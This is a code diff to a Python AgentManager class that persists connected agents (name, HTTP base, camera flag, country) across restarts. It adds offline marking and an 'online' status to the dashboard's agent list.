@@ -30,6 +30,28 @@ class AgentManager:
                     self._blacklist = set(json.load(f) or [])
             except Exception:
                 self._blacklist = set()
+        # Load any previously persisted agents as offline entries
+        try:
+            with open(AGENTS_FILE, 'r', encoding='utf-8') as f:
+                data = json.load(f) or []
+            if isinstance(data, list):
+                for entry in data:
+                    try:
+                        aid = entry.get('agent_id')
+                        if not aid:
+                            continue
+                        self.agents[aid] = {
+                            'socket': None,
+                            'name': entry.get('name') or aid,
+                            'http_base': entry.get('http_base'),
+                            'has_camera': bool(entry.get('has_camera')),
+                            'country': entry.get('country'),
+                            'country_code': entry.get('country_code'),
+                        }
+                    except Exception:
+                        continue
+        except Exception:
+            pass
 
     async def register_dashboard(self, ws: WebSocket) -> None:
         async with self._lock:
@@ -42,23 +64,38 @@ class AgentManager:
 
     async def register_agent(self, agent_id: str, name: str, http_base: str, ws: WebSocket, has_camera: bool = False, country: str | None = None, country_code: str | None = None) -> None:
         async with self._lock:
+            prev = self.agents.get(agent_id, {})
             self.agents[agent_id] = {
                 "socket": ws,
-                "name": name,
-                "http_base": http_base,
-                "has_camera": bool(has_camera),
-                "country": country,
-                "country_code": country_code,
+                "name": name or prev.get("name") or agent_id,
+                "http_base": http_base or prev.get("http_base"),
+                "has_camera": bool(has_camera) if has_camera is not None else bool(prev.get("has_camera")),
+                "country": country if country is not None else prev.get("country"),
+                "country_code": country_code if country_code is not None else prev.get("country_code"),
             }
         await self.persist_agents()
         await self.broadcast_agents()
 
     async def remove_agent(self, agent_id: str) -> None:
+        # Backwards-compat: full removal (used by explicit clear)
         async with self._lock:
             if agent_id in self.agents:
                 self.agents.pop(agent_id, None)
         await self.persist_agents()
         await self.broadcast_agents()
+
+    async def mark_offline(self, agent_id: str) -> None:
+        async with self._lock:
+            if agent_id in self.agents:
+                try:
+                    self.agents[agent_id]["socket"] = None
+                except Exception:
+                    self.agents[agent_id] = {k: v for k, v in self.agents[agent_id].items() if k != "socket"}
+        await self.persist_agents()
+        await self.broadcast_agents()
+
+    async def clear_agent(self, agent_id: str) -> None:
+        await self.remove_agent(agent_id)
 
     async def force_disconnect_agent(self, agent_id: str) -> None:
         ws: WebSocket | None = None
@@ -71,8 +108,8 @@ class AgentManager:
                 await ws.close()
         except Exception:
             pass
-        # Ensure removal and broadcast
-        await self.remove_agent(agent_id)
+        # Mark offline and broadcast (do not clear from registry)
+        await self.mark_offline(agent_id)
 
     async def persist_agents(self) -> None:
         agents_list = await self.get_agents()
@@ -81,14 +118,21 @@ class AgentManager:
 
     async def get_agents(self) -> List[Dict[str, Any]]:
         async with self._lock:
-            return [{
-                "agent_id": aid,
-                "name": info.get("name"),
-                "http_base": info.get("http_base"),
-                "has_camera": bool(info.get("has_camera")),
-                "country": info.get("country"),
-                "country_code": info.get("country_code"),
-            } for aid, info in self.agents.items()]
+            out: List[Dict[str, Any]] = []
+            for aid, info in self.agents.items():
+                try:
+                    out.append({
+                        "agent_id": aid,
+                        "name": info.get("name"),
+                        "http_base": info.get("http_base"),
+                        "has_camera": bool(info.get("has_camera")),
+                        "country": info.get("country"),
+                        "country_code": info.get("country_code"),
+                        "online": bool(info.get("socket")),
+                    })
+                except Exception:
+                    out.append({"agent_id": aid, "name": aid, "online": False})
+            return out
 
     # Blacklist management
     async def is_blacklisted(self, agent_id: str) -> bool:
